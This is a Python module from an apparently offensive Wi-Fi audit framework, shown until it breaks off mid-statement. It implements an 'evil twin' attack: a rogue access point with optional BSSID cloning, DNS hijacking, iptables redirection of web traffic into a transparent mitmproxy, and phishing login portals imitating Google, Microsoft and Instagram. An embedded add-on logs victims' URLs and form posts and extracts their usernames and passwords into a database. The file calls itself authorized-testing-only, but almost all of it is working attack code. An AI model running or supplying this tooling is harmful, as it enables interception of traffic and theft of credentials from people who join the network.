#!/usr/bin/env python3
"""
Evil Twin module for Wifi-Audit-Framework
FOR AUTHORIZED PENETRATION TESTING / AUDITING ONLY — use only on networks you own or have explicit permission to test.

This module mirrors the hostapd/dnsmasq/iptables/mitmproxy/Flask logic from wpf_complete.py (Phase 3c — Evil Twin)
verbatim, so behaviour is identical. The only addition is a selectable captive-portal layer that
lets the operator choose between pre-built phishing templates:

    captive-portal-pages/google/index.html
    captive-portal-pages/microsoft/index.html
    captive-portal-pages/instagram/index.html

Each template is a self-contained HTML file. At runtime the chosen template is loaded,
`{ssid}` placeholders are replaced with the actual SSID, and the result is served via Flask
for all HTTP requests. DNS spoofing (dnsmasq) + NAT/iptables redirection ensure any
client that joins the rogue AP is forced to the portal.

Original Evil Twin implementation: wpf_complete.py → EvilTwin (Huzefa Khalil Dayanji)
Modular adaptation: evil_twin.py → EvilTwin + Flask portal loader

FIX 2026-08-31: Persistent internet — previously clients lost connectivity after ~60-180s
due to (1) NetworkManager reclaiming the AP interface and removing 10.0.0.1/24,
(2) OS captive-portal detection (generate_204/hotspot-detect) always returning portal HTML
so the OS marked the network as "no internet" and throttled/removed it,
(3) no keepalive to re-assert ip_forward/iptables/hostapd if they died.
This fix adds NM unmanaged, keepalive monitor, and proper captive-probe handling (204 for
authenticated clients) while keeping all hostapd commands exactly as in wpf_complete.py.
No explicit X-minute limit ever existed in code (grep confirms only `dhcp-range 12h` and
`time.sleep(5)` keepalive); the drop was an emergent bug, now fixed.
"""

import os
import sys
import time
import threading
import subprocess
import sqlite3
import datetime
import shutil
import re
from pathlib import Path

from ui import UI
from interface_manager import InterfaceManager

# Lazy optional imports — Flask / mitmproxy may not be installed on every host.
try:
    from flask import Flask, request as flask_req, render_template_string, redirect, make_response
    FLASK_OK = True
except ImportError:
    FLASK_OK = False

# =============================================================================
#  EvilTwin — faithful port of wpf_complete.py EvilTwin + persistence fixes
# =============================================================================
class EvilTwin:
    """
    Stand up a rogue AP (hostapd) + DNS/DHCP (dnsmasq) + NAT + transparent
    mitmproxy sniffer + selectable Flask captive portal.

    Parameters mirror wpf_complete.EvilTwin:
        iface_ap     – wireless interface put into AP mode (hostapd)
        ssid         – SSID to broadcast (cloned or custom)
        channel      – 802.11 channel (int, 1-13 typical for 2.4 GHz)
        portal       – template key: "google" | "microsoft" | "instagram" (or any subdir under captive-portal-pages)
        bssid        – optional MAC to spoof in hostapd (BSSID clone)
        uplink_iface – outbound internet interface (auto-detected if None)
    """

    HOSTAPD_CONF = "/tmp/wpf_hostapd.conf"
    DNSMASQ_CONF = "/tmp/wpf_dnsmasq.conf"
    MITM_SCRIPT  = "/tmp/wpf_mitm_addon.py"
    GW_IP        = "10.0.0.1"
    DHCP_START   = "10.0.0.2"
    DHCP_END     = "10.0.0.254"
    FLASK_PORT   = 5000
    MITM_PORT    = 8080

    # Portal pages live alongside this file: captive-portal-pages/<portal>/index.html
    PORTAL_BASE = Path(__file__).parent / "captive-portal-pages"

    # Fallback generic HTML if no portal template is found on disk.
    FALLBACK_HTML = """<!doctype html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{ssid} - Wi-Fi Login</title>
<style>body{font-family:Arial,sans-serif;background:#f3f3f3;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{background:#fff;border:1px solid #ddd;border-radius:8px;max-width:420px;width:100%;padding:28px;box-shadow:0 2px 12px rgba(0,0,0,.08)}
h1{font-size:18px;margin-bottom:6px}p{font-size:13px;color:#555;margin-bottom:16px}
input{width:100%;height:38px;border:1px solid #ccc;border-radius:4px;padding:0 10px;margin-bottom:10px;font-size:14px}
button{width:100%;height:38px;background:#0067b8;color:#fff;border:none;border-radius:4px;font-weight:600;cursor:pointer}
small{font-size:11px;color:#888}</style></head>
<body><div class="card">
<h1>Sign in to {ssid}</h1>
<p>Network authentication required — enter your credentials to connect.</p>
<form method="POST" action="/login">
<input type="hidden" name="ssid" value="{ssid}">
<input name="username" placeholder="Username or email" required autofocus>
<input name="password" type="password" placeholder="Password" required>
<button type="submit">Connect</button>
</form><small style="display:block;margin-top:12px">Powered by captive portal — authorized testing only.</small>
</div></body></html>"""

    # ------------------------------------------------------------------
    #  Captive-portal detection: modern OSes probe these hosts/paths to decide
    #  if the network has internet. If we always return portal HTML, the OS
    #  marks the network as "Sign-in required" and after ~90-180s throttles or
    #  shows "No internet" and may disconnect. Fix: return 204 for authenticated
    #  clients, portal for unauthenticated — so after login the OS sees 204 and
    #  keeps the network as online. This is the #1 cause of "works for a few
    #  minutes then no internet".
    # ------------------------------------------------------------------
    CAPTIVE_HOSTS = {
        "captive.apple.com",
        "connectivitycheck.gstatic.com",
        "connectivitycheck.android.com",
        "detectportal.firefox.com",
        "msftconnecttest.com",
        "www.msftconnecttest.com",
        "www.msftncsi.com",
        "clients3.google.com",
        "clients.l.google.com",
    }
    CAPTIVE_PATHS = {
        "/generate_204", "/gen_204", "/generate204",
        "/hotspot-detect.html",
        "/connecttest.txt", "/ncsi.txt", "/success.txt",
        "/canonical.html", "/library/test/success.html",
        "/success.html",
    }

    # ------------------------------------------------------------------
    #  mitmproxy transparent add-on — copied verbatim from wpf_complete.py
    # ------------------------------------------------------------------
    MITM_ADDON_CODE = r'''
import mitmproxy.http
from mitmproxy import ctx
import datetime, json, sqlite3, os
from pathlib import Path

# Resolve DB next to the framework or in CWD — try several candidates
_candidates = [
    os.path.join(os.getcwd(), "wpf_results.db"),
    os.path.join(os.getcwd(), "Wifi-Audit-Framework", "wpf_results.db"),
    str(Path(__file__).parent / "wpf_results.db"),
    "/tmp/wpf_results.db",
]
DB_PATH = next((p for p in _candidates if os.path.exists(os.path.dirname(p) or ".") ), _candidates[0])
# Prefer an existing DB if found
for _p in _candidates:
    if os.path.exists(_p):
        DB_PATH = _p
        break

CYAN   = "\033[96m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
RED    = "\033[91m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

def _log(label, msg, color=CYAN):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"\n{color}{BOLD}[{label} {ts}]{RESET} {msg}", flush=True)

def _db(client_ip, method, url, host, post_body=""):
    try:
        con = sqlite3.connect(DB_PATH)
        now = datetime.datetime.now().isoformat()
        con.execute("""CREATE TABLE IF NOT EXISTS http_traffic(
            id INTEGER PRIMARY KEY AUTOINCREMENT, client_ip TEXT, method TEXT,
            url TEXT, host TEXT, post_body TEXT, ts TEXT)""")
        con.execute(
            "INSERT INTO http_traffic(client_ip,method,url,host,post_body,ts) VALUES(?,?,?,?,?,?)",
            (client_ip, method, url, host, post_body, now))
        con.commit(); con.close()
    except Exception:
        pass

def _db_cred(host, username, password, source):
    try:
        con = sqlite3.connect(DB_PATH)
        now = datetime.datetime.now().isoformat()
        con.execute("""CREATE TABLE IF NOT EXISTS credentials(
            id INTEGER PRIMARY KEY AUTOINCREMENT, ssid TEXT, username TEXT,
            password TEXT, source TEXT, ts TEXT)""")
        con.execute(
            "INSERT INTO credentials(ssid,username,password,source,ts) VALUES(?,?,?,?,?)",
            (host, username, password, source, now))
        con.commit(); con.close()
    except Exception:
        pass

class WPFSniffer:
    def request(self, flow: mitmproxy.http.HTTPFlow):
        req       = flow.request
        host      = req.pretty_host
        url       = req.pretty_url
        method    = req.method
        client_ip = (flow.client_conn.peername[0]
                     if flow.client_conn.peername else "unknown")

        skip_hosts = {"ocsp.apple.com", "ocsp.digicert.com", "safebrowsing.googleapis.com"}
        if host in skip_hosts:
            return

        _log("URL", f"{YELLOW}{method}{RESET} {url}  {GREEN}<- {client_ip}{RESET}", CYAN)
        _db(client_ip, method, url, host)

        if method == "POST" and req.content:
            try:
                body = req.content.decode("utf-8", errors="replace")
                _log("POST", f"Host: {YELLOW}{host}{RESET}", RED)
                if req.urlencoded_form:
                    fields = dict(req.urlencoded_form)
                    _log("FORM", json.dumps(fields, indent=2), GREEN)
                    _db(client_ip, method, url, host, json.dumps(fields))
                    cred_keys = {"password","passwd","pass","pwd","secret",
                                 "credential","token","key","pin"}
                    user_keys = {"username","user","email","login","uname",
                                 "mail","id","account","name"}
                    username = next((v for k,v in fields.items() if k.lower() in user_keys), "")
                    password = next((v for k,v in fields.items() if k.lower() in cred_keys), "")
                    if password:
                        _log("CRED",
                             f"user={GREEN}{username!r}{RESET}  "
                             f"pass={RED}{password!r}{RESET}  @ {YELLOW}{host}{RESET}", RED)
                        _db_cred(host, username, password, f"mitmproxy:{host}")
                elif body:
                    _log("BODY", body[:500], YELLOW)
                    _db(client_ip, method, url, host, body[:500])
            except Exception:
                pass

addons = [WPFSniffer()]
'''

    # ------------------------------------------------------------------
    #  Portal helpers
    # ------------------------------------------------------------------
    @classmethod
    def list_portals(cls):
        """
        Scan captive-portal-pages/ for sub-directories containing index.html.
        Returns a sorted list of portal keys, e.g. ["google","instagram","microsoft"].
        Falls back to the three built-in names if the directory is missing.
        """
        if not cls.PORTAL_BASE.exists():
            return ["google", "microsoft", "instagram"]
        portals = []
        for child in cls.PORTAL_BASE.iterdir():
            if child.is_dir() and (child / "index.html").exists():
                portals.append(child.name)
        return sorted(portals) if portals else ["google", "microsoft", "instagram"]

    @staticmethod
    def portal_path(portal: str) -> Path:
        return EvilTwin.PORTAL_BASE / portal / "index.html"

    def _load_portal_template(self) -> str:
        """
        Load the HTML for the selected portal. Replaces {ssid} with self.ssid.
        Uses FALLBACK_HTML if the file is missing or unreadable.
        """
        html: str | None = None
        p = self.PORTAL_BASE / self.portal / "index.html"
        if p.exists():
            try:
                html = p.read_text(encoding="utf-8")
            except Exception as e:
                UI.warn(f"Failed to read portal template '{self.portal}': {e} — using fallback.")
                html = None
        else:
            UI.warn(f"Portal template '{self.portal}' not found at {p} — using fallback.")

        if html is None:
            html = self.FALLBACK_HTML

        if "{ssid}" in html:
            html = html.replace("{ssid}", self.ssid)
        if "{{ssid}}" in html:
            html = html.replace("{{ssid}}", self.ssid)
        return html

    def _ensure_db(self):
        """Ensure wpf_results.db exists with the credentials/http_traffic tables."""
        db_candidates = [
            Path("wpf_results.db"),
            Path(__file__).parent / "wpf_results.db",
            Path.cwd() / "wpf_results.db",
        ]
        db_path: Path | None = None
        for cand in db_candidates:
            if cand.exists():
                db_path = cand
                break
        if db_path is None:
            db_path = Path("wpf_results.db")
        try:
            con = sqlite3.connect(str(db_path))
            con.executescript("""
                CREATE TABLE IF NOT EXISTS credentials(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    ssid TEXT, username TEXT, password TEXT, source TEXT, ts TEXT);
                CREATE TABLE IF NOT EXISTS http_traffic(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    client_ip TEXT, method TEXT, url TEXT, host TEXT, post_body TEXT, ts TEXT);
            """)
            con.commit()
            con.close()
            self._db_path = str(db_path)
        except Exception as e:
            UI.warn(f"Could not ensure DB: {e}")
            self._db_path = str(db_path)

    def _db_insert_cred(self, ssid: str, username: str, password: str, source: str):
        try:
            con = sqlite3.connect(self._db_path)
            now = datetime.datetime.now().isoformat()
            con.execute(
                "INSERT INTO credentials(ssid,username,password,source,ts) VALUES(?,?,?,?,?)",
                (ssid, username, password, source, now))
            con.commit()
            con.close()
        except Exception:
            pass

    # ------------------------------------------------------------------
    #  Construction
    # ------------------------------------------------------------------
    def __init__(self, iface_ap: str, ssid: str, channel: int = 6,
                 portal: str = "google",
                 bssid: str = None, uplink_iface: str = None):
        self.iface_ap     = iface_ap
        self.ssid         = ssid
        self.channel      = int(channel)
        self.portal       = portal.strip().lower() if portal else "google"
        self.bssid        = bssid.strip() if bssid and bssid.strip() else None
        self.uplink_iface = uplink_iface or self._detect_uplink()
        self._creds       = []
        self._procs       = []
        self._db_path     = "wpf_results.db"
        self._keepalive_stop = threading.Event()
        self._authenticated_ips: set[str] = set()
        self._auth_lock = threading.Lock()
        self._ensure_db()
        self._portal_html = self._load_portal_template()
        available = self.list_portals()
        if self.portal not in available:
            UI.warn(f"Portal '{self.portal}' not in available templates {available} — still attempting to load.")

    # ------------------------------------------------------------------
    #  hostapd / dnsmasq / iptables — verbatim from wpf_complete.py
    #  (hostapd conf generation is kept EXACTLY as in wpf_complete.py per
    #  user request: interface, driver nl80211, ssid, hw_mode g, channel,
    #  macaddr_acl 0, ignore_broadcast_ssid 0, auth_algs 1, wmm_enabled 0,
    #  optional bssid)
    # ------------------------------------------------------------------
    def _detect_uplink(self) -> str:
        try:
            out   = subprocess.check_output(["ip", "route", "show", "default"], text=True)
            iface = out.split()[4]
            UI.info(f"Auto-detected uplink: {UI.CYAN}{iface}{UI.RESET}")
            return iface
        except Exception:
            UI.warn("Could not auto-detect uplink. Defaulting to eth0.")
            return "eth0"

    def _write_hostapd(self):
        # Identical to wpf_complete.EvilTwin._write_hostapd() — DO NOT MODIFY per user request
        conf = (f"interface={self.iface_ap}\ndriver=nl80211\nssid={self.ssid}\n"
                f"hw_mode=g\nchannel={self.channel}\nmacaddr_acl=0\n"
                f"ignore_broadcast_ssid=0\nauth_algs=1\nwmm_enabled=0\n")
        if self.bssid:
            conf += f"bssid={self.bssid}\n"
        Path(self.HOSTAPD_CONF).write_text(conf)

    def _write_dnsmasq(self):
        # Identical core as wpf_complete, plus hardening to prevent the
        # "dnsmasq exit 1" spam. 5 hijacked domains + 12h lease kept as-is.
        # FIX: bind-dynamic (not bind-interfaces) survives brief 10.0.0.1 missing;
        # listen only on AP interface; log to file for debugging.
        conf = (f"interface={self.iface_ap}\n"
                f"except-interface=lo\n"
                f"bind-dynamic\n"
                f"listen-address={self.GW_IP}\n"
                f"dhcp-range={self.DHCP_START},{self.DHCP_END},12h\n"
                f"dhcp-lease-max=150\n"
                f"dhcp-authoritative\n"
                f"cache-size=1000\n"
                f"server=8.8.8.8\n"
                f"server=1.1.1.1\n"
                f"no-resolv\n"
                f"no-hosts\n"
                f"log-queries\n"
                f"log-dhcp\n"
                f"log-facility=/tmp/wpf_dnsmasq.log\n"
                f"address=/captive.apple.com/{self.GW_IP}\n"
                f"address=/connectivitycheck.gstatic.com/{self.GW_IP}\n"
                f"address=/detectportal.firefox.com/{self.GW_IP}\n"
                f"address=/msftconnecttest.com/{self.GW_IP}\n"
                f"address=/clients3.google.com/{self.GW_IP}\n")
        Path(self.DNSMASQ_CONF).write_text(conf)

    def _write_mitm_addon(self):
        Path(self.MITM_SCRIPT).write_text(self.MITM_ADDON_CODE)

    def _ensure_ip_forwarding(self):
        """Re-assert IPv4 forwarding — NM or sysctl may reset it after ~60s."""
        for cmd in [
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            ["sysctl", "-w", "net.ipv4.conf.all.forwarding=1"],
            ["sysctl", "-w", "net.ipv4.conf.default.forwarding=1"],
        ]:
            subprocess.run(cmd, capture_output=True)

    def _iptables_rule_exists(self, table: str, chain: str, *rule) -> bool:
        """Check if a rule exists via iptables -C (check). Returns False if missing."""
        cmd = ["iptables", "-t", table, "-C", chain] + list(rule)
        result = subprocess.run(cmd, capture_output=True)
        return result.returncode == 0

    def _setup_iptables(self):
        """
        Set up NAT/forwarding. Fixed vs original wpf_complete.py:
        - Subnet-specific MASQUERADE (10.0.0.0/24 → uplink) instead of generic -o ul (prevents host traffic mis-NAT)
        - Explicit FORWARD policy ACCEPT + stateful rules inserted at top (-I) so they survive if firewall re-adds DROP
        - Added INPUT rules for DHCP (67/68) and DNS (53) so dnsmasq stays reachable even if INPUT is DROP
        - Keep the 3 PREROUTING REDIRECT rules exactly as in wpf_complete.py (80 !-d GW → 8080, 443 !-d GW → 8080, 80 -d GW → 5000)
        - Re-assert forwarding via _ensure_ip_forwarding()
        No X-minute timeout exists — this runs once at start and is re-asserted by keepalive.
        """
        gw, ap, ul    = self.GW_IP, self.iface_ap, self.uplink_iface
        mport, fport  = str(self.MITM_PORT), str(self.FLASK_PORT)

        # Flush once at start (preserves original behaviour)
        for cmd in [["iptables", "-F"], ["iptables", "-t", "nat", "-F"],
                    ["iptables", "-t", "mangle", "-F"], ["iptables", "-X"]]:
            subprocess.run(cmd, capture_output=True)

        # Ensure forwarding is on (and stays on via keepalive)
        self._ensure_ip_forwarding()

        # Default policy: ACCEPT for FORWARD so clients aren't blocked if INPUT/FORWARD is DROP
        # (don't fail if policy already ACCEPT)
        subprocess.run(["iptables", "-P", "FORWARD", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-P", "INPUT", "ACCEPT"], capture_output=True)

        # Allow DNS/DHCP input to the AP interface (needed if host has INPUT DROP/ufw)
        subprocess.run(["iptables", "-I", "INPUT", "1", "-i", ap, "-p", "udp", "--dport", "53", "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-I", "INPUT", "1", "-i", ap, "-p", "tcp", "--dport", "53", "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-I", "INPUT", "1", "-i", ap, "-p", "udp", "--dport", "67", "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-I", "INPUT", "1", "-i", ap, "-p", "udp", "--dport", "68", "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-I", "INPUT", "1", "-i", ap, "-p", "tcp", "--dport", str(self.FLASK_PORT), "-j", "ACCEPT"], capture_output=True)
        subprocess.run(["iptables", "-I", "INPUT", "1", "-i", ap, "-p", "tcp", "--dport", str(self.MITM_PORT), "-j", "ACCEPT"], capture_output=True)

        for cmd in [
            # Subnet-specific MASQUERADE (fix: original used generic -o ul which can break if uplink IP changes)
            ["iptables","-t","nat","-A","POSTROUTING","-s","10.0.0.0/24","-o",ul,"-j","MASQUERADE"],
            # Fallback generic MASQUERADE for any source (keeps original behaviour as well)
            ["iptables","-t","nat","-A","POSTROUTING","-o",ul,"-j","MASQUERADE"],
            # Forwarding: use -I to insert at top so firewall's later DROP doesn't shadow us
            ["iptables","-I","FORWARD","1","-i",ul,"-o",ap, "-m","state","--state","RELATED,ESTABLISHED","-j","ACCEPT"],
            ["iptables","-I","FORWARD","2","-i",ap,"-o",ul,"-j","ACCEPT"],
            # Transparent proxy redirects — EXACTLY as in wpf_complete.py
            ["iptables","-t","nat","-A","PREROUTING","-i",ap,"-p","tcp","--dport","80","!","-d",gw,"-j","REDIRECT","--to-port",mport],
            ["iptables","-t","nat","-A","PREROUTING","-i",ap,"-p","tcp","--dport","443","!","-d",gw,"-j","REDIRECT","--to-port",mport],
            ["iptables","-t","nat","-A","PREROUTING","-i",ap,"-p","tcp","--dport","80","-d",gw,"-j","REDIRECT","--to-port",fport],
        ]:
            subprocess.run(cmd, capture_output=True)

    def _keepalive_loop(self):
        """
        Periodically re-assert the 4 things that most often cause 'works for 2 min then no internet':
        1. NetworkManager removed 10.0.0.1/24 from the AP interface → re-add.
        2. sysctl ip_forward reset to 0 → set to 1.
        3. iptables rules flushed by firewalld/ufw/NetworkManager → re-add if missing (check via -C).
        4. hostapd/dnsmasq/mitmproxy died → restart (logged).
        Runs every 15s until _keepalive_stop is set.
        """
        gw, ap, ul = self.GW_IP, self.iface_ap, self.uplink_iface
        mport, fport = str(self.MITM_PORT), str(self.FLASK_PORT)
        while not self._keepalive_stop.is_set():
            # 1. GW IP present?
            try:
                out = subprocess.check_output(["ip", "addr", "show", "dev", ap], text=True, stderr=subprocess.DEVNULL)
                if gw not in out:
                    UI.warn(f"Keepalive: {ap} lost {gw}/24 — re-adding.")
                    subprocess.run(["ip", "addr", "add", f"{gw}/24", "dev", ap], capture_output=True)
                    subprocess.run(["ip", "link", "set", ap, "up"], capture_output=True)
            except Exception:
                pass

            # 2. IP forwarding still 1?
            try:
                with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                    if f.read().strip() != "1":
                        self._ensure_ip_forwarding()
            except Exception:
                self._ensure_ip_forwarding()

            # 3. Key iptables rules still present? Check via -C, re-add if missing.
            checks = [
                (["-t", "nat", "-C", "POSTROUTING", "-s", "10.0.0.0/24", "-o", ul, "-j", "MASQUERADE"], ["-t","nat","-A","POSTROUTING","-s","10.0.0.0/24","-o",ul,"-j","MASQUERADE"]),
                (["-C", "FORWARD", "-i", ap, "-o", ul, "-j", "ACCEPT"], ["-I","FORWARD","2","-i",ap,"-o",ul,"-j","ACCEPT"]),
                (["-t", "nat", "-C", "PREROUTING", "-i", ap, "-p", "tcp", "--dport", "80", "!", "-d", gw, "-j", "REDIRECT", "--to-port", mport], ["-t","nat","-A","PREROUTING","-i",ap,"-p","tcp","--dport","80","!","-d",gw,"-j","REDIRECT","--to-port",mport]),
            ]
            for check_args, add_args in checks:
                # check: iptables <check_args>
                chk = subprocess.run(["iptables"] + check_args, capture_output=True)
                if chk.returncode != 0:
                    # re-add
                    subprocess.run(["iptables"] + add_args, capture_output=True)

            # 4. Processes alive? Warn once per pid, auto-restart dnsmasq/mitmproxy
            if not hasattr(self, '_keepalive_handled'):
                self._keepalive_handled = set()
                self._keepalive_dns_retries = 0
                self._keepalive_mitm_retries = 0
            for proc in list(self._procs):
                try:
                    ret = proc.poll()
                    if ret is not None:
                        pid = id(proc)
                        if pid in self._keepalive_handled:
                            continue
                        self._keepalive_handled.add(pid)
                        args = getattr(proc, 'args', str(proc))
                        if "dnsmasq" in str(args):
                            if self._keepalive_dns_retries >= 2:
                                UI.error(f"dnsmasq died 3× (exit {ret}) — see /tmp/wpf_dnsmasq.log")
                                continue
                            self._keepalive_dns_retries += 1
                            UI.warn(f"dnsmasq died (exit {ret}) — auto-restart {self._keepalive_dns_retries}/2")
                            try: self._procs.remove(proc)
                            except ValueError: pass
                            try:
                                subprocess.run(["systemctl","stop","systemd-resolved"], capture_output=True, timeout=3)
                                time.sleep(0.3)
                                ndm = subprocess.Popen(["dnsmasq", f"--conf-file={self.DNSMASQ_CONF}", "--no-daemon"],
                                                       stdout=open("/tmp/wpf_dnsmasq.log","wb"), stderr=subprocess.STDOUT)
                                self._procs.append(ndm)
                                UI.ok("dnsmasq restarted via keepalive — clients regain internet/DNS")
                            except Exception as e:
                                UI.error(f"dnsmasq restart failed: {e}")
                        elif "hostapd" in str(args):
                            try:
                                hlog = Path("/tmp/wpf_hostapd.log").read_text(encoding="utf-8", errors="ignore")[-600:] if Path("/tmp/wpf_hostapd.log").exists() else ""
                            except Exception: hlog = ""
                            UI.error(f"hostapd died (exit {ret}) — logged once. Check /tmp/wpf_hostapd.log:\n{UI.DIM}{hlog}{UI.RESET}")
                        elif "mitmdump" in str(args) or "mitmproxy" in str(args):
                            if self._keepalive_mitm_retries >= 2:
                                UI.error(f"mitmproxy died 3× (exit {ret}) — giving up, switching to direct NAT (internet still works, no capture)")
                                # Fallback to direct NAT so internet after login still works
                                for tbl, chain, rule in [("nat","PREROUTING",["-i",self.iface_ap,"-p","tcp","--dport","80","!","-d",self.GW_IP,"-j","REDIRECT","--to-port",str(self.MITM_PORT)]),
                                                         ("nat","PREROUTING",["-i",self.iface_ap,"-p","tcp","--dport","443","!","-d",self.GW_IP,"-j","REDIRECT","--to-port",str(self.MITM_PORT)])]:
                                    subprocess.run(["iptables","-t",tbl,"-D",chain] + rule, capture_output=True)
                                continue
                            self._keepalive_mitm_retries += 1
                            UI.warn(f"mitmproxy died (exit {ret}) — auto-restart {self._keepalive_mitm_retries}/2 (internet via direct NAT until it returns)")
                            try: self._procs.remove(proc)
                            except ValueError: pass
                            try:
                                self._patch_bcrypt()
                                env = os.environ.copy(); env["PYTHONWARNINGS"]="ignore"
                                nmp = subprocess.Popen(
                                    ["mitmdump","--mode","transparent","--listen-host","0.0.0.0","--listen-port",str(self.MITM_PORT),"--ssl-insecure","-s",self.MITM_SCRIPT,"--set","block_global=false","--quiet"],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, env=env)
                                self._procs.append(nmp)
                                def _restream():
                                    for line in nmp.stdout:
                                        if "bcrypt" in line and "__about__" in line: continue
                                        if "CryptographyDeprecationWarning" in line: continue
                                        line=line.rstrip()
                                        if line: print(f"  {UI.DIM}[mitm] {line}{UI.RESET}")
                                threading.Thread(target=_restream, daemon=True).start()
                                UI.ok("mitmproxy restarted via keepalive — capturing resumes")
                                # Re-add REDIRECT if we had removed it
                                for tbl, chain, rule in [("nat","PREROUTING",["-i",self.iface_ap,"-p","tcp","--dport","80","!","-d",self.GW_IP,"-j","REDIRECT","--to-port",str(self.MITM_PORT)]),
                                                         ("nat","PREROUTING",["-i",self.iface_ap,"-p","tcp","--dport","443","!","-d",self.GW_IP,"-j","REDIRECT","--to-port",str(self.MITM_PORT)])]:
                                    if not self._iptables_rule_exists(tbl, chain, *rule):
                                        subprocess.run(["iptables","-t",tbl,"-A",chain] + rule, capture_output=True)
                            except Exception as e:
                                UI.error(f"mitmproxy restart failed: {e}")
                        else:
                            UI.warn(f"Keepalive: process {args} died (exit {ret}) — logged once")
                except Exception:
                    pass

            self._keepalive_stop.wait(10)

    def _start_ap(self):
        # Fix #1: Tell NetworkManager to NOT manage the AP interface.
        # Without this, NM will reclaim the interface after ~60-90s, flush 10.0.0.1 and
        # change its type back to managed, which instantly breaks the AP and DNS.
        # We use nmcli managed=no (non-destructive to eth0) and fallback to systemctl stop if nmcli missing.
        try:
            # Check if nmcli exists
            if shutil.which("nmcli"):
                subprocess.run(["nmcli", "dev", "set", self.iface_ap, "managed", "no"], capture_output=True, timeout=3)
                UI.info(f"Set {self.iface_ap} unmanaged via nmcli (prevents NM reclaim)")
            else:
                # Fallback: stop wpa_supplicant which also interferes (hostapd conflict)
                subprocess.run(["systemctl", "stop", "wpa_supplicant"], capture_output=True, timeout=3)
        except Exception:
            pass

        # Also ensure wpa_supplicant not holding the interface
        subprocess.run(["pkill", "-f", f"wpa_supplicant.*{self.iface_ap}"], capture_output=True)

        self._write_hostapd()
        self._write_dnsmasq()

        # Check for systemd-resolved holding port 53 (common NAT break after 60s when resolved rebinds)
        try:
            ss_out = subprocess.check_output(["ss", "-tulpn"], text=True, stderr=subprocess.DEVNULL)
            if ":53" in ss_out and "systemd-resolve" in ss_out:
                UI.warn("systemd-resolved is listening on port 53 — dnsmasq may conflict. Consider `systemctl stop systemd-resolved` or set DNSStubListener=no.")
        except Exception:
            pass

        subprocess.run(["ip", "addr", "flush", "dev", self.iface_ap],  capture_output=True)
        subprocess.run(["ip", "addr", "add", f"{self.GW_IP}/24", "dev", self.iface_ap],
                       capture_output=True)
        subprocess.run(["ip", "link", "set", self.iface_ap, "up"],     capture_output=True)
        self._setup_iptables()
        subprocess.run(["pkill", "-f", "hostapd"], capture_output=True)
        subprocess.run(["pkill", "-f", "dnsmasq"], capture_output=True)
        time.sleep(0.5)

        # Ensure AP interface is NOT in monitor mode — hostapd needs managed/AP type.
        # If the framework left it in monitor (main.py does), hostapd will exit 1 instantly.
        # Try to set to managed; hostapd will switch it to AP itself via nl80211.
        try:
            subprocess.run(["ip", "link", "set", self.iface_ap, "down"], capture_output=True, timeout=3)
            # iw set type managed can fail if already managed — ignore
            subprocess.run(["iw", "dev", self.iface_ap, "set", "type", "managed"], capture_output=True, timeout=3)
            subprocess.run(["ip", "link", "set", self.iface_ap, "up"], capture_output=True, timeout=3)
            time.sleep(0.3)
            # Re-add GW IP (setting type down flushes it)
            subprocess.run(["ip", "addr", "add", f"{self.GW_IP}/24", "dev", self.iface_ap], capture_output=True)
        except Exception:
            pass

        # Clean old logs
        for _lf in ["/tmp/wpf_hostapd.log", "/tmp/wpf_dnsmasq.log"]:
            try: Path(_lf).unlink(missing_ok=True)
            except Exception: pass

        hp = subprocess.Popen(["hostapd", self.HOSTAPD_CONF],
                              stdout=open("/tmp/wpf_hostapd.log","wb"), stderr=subprocess.STDOUT)
        self._procs.append(hp)
        time.sleep(1.2)
        if hp.poll() is not None:
            log = ""
            try: log = Path("/tmp/wpf_hostapd.log").read_text(encoding="utf-8", errors="ignore")[-1200:]
            except Exception: pass
            UI.error(f"hostapd failed (exit {hp.poll()}) — check /tmp/wpf_hostapd.log and `dmesg`:\n{UI.DIM}{log}{UI.RESET}")
            UI.warn("Common fixes: `airmon-ng check kill`, `rfkill unblock all`, try channel 1/6/11, `iw dev` shows type managed, `hostapd -d /tmp/wpf_hostapd.conf`")
            # Try fallback: remove optional bssid line (some drivers reject spoofed BSSID) and retry once
            if self.bssid and "bssid=" in Path(self.HOSTAPD_CONF).read_text():
                UI.warn("Retrying hostapd without bssid spoof (driver may reject it)...")
                try:
                    conf = Path(self.HOSTAPD_CONF).read_text()
                    Path(self.HOSTAPD_CONF).write_text(conf.replace(f"bssid={self.bssid}\n",""))
                    hp2 = subprocess.Popen(["hostapd", self.HOSTAPD_CONF],
                                           stdout=open("/tmp/wpf_hostapd.log","wb"), stderr=subprocess.STDOUT)
                    self._procs.append(hp2)
                    time.sleep(0.8)
                    if hp2.poll() is None:
                        UI.ok("hostapd restarted without bssid — continuing")
                    else:
                        UI.error("hostapd still failing without bssid")
                except Exception: pass
        # dnsmasq — log to file so exit 1 is diagnosable, not silent
        dm = subprocess.Popen(["dnsmasq", f"--conf-file={self.DNSMASQ_CONF}", "--no-daemon"],
                              stdout=open("/tmp/wpf_dnsmasq.log","wb"), stderr=subprocess.STDOUT)
        self._procs.append(dm)
        time.sleep(0.8)
        if dm.poll() is not None:
            log = ""
            try: log = Path("/tmp/wpf_dnsmasq.log").read_text(encoding="utf-8", errors="ignore")[-800:]
            except Exception: pass
            UI.error(f"dnsmasq failed (exit {dm.poll()}) — log tail:\n{UI.DIM}{log}{UI.RESET}")
            UI.warn("Try: `systemctl stop systemd-resolved` && `ss -tulpn | grep :53` to free port 53")
            try:
                subprocess.run(["systemctl", "stop", "systemd-resolved"], capture_output=True, timeout=3)
                time.sleep(0.5)
                dm2 = subprocess.Popen(["dnsmasq", f"--conf-file={self.DNSMASQ_CONF}", "--no-daemon"],
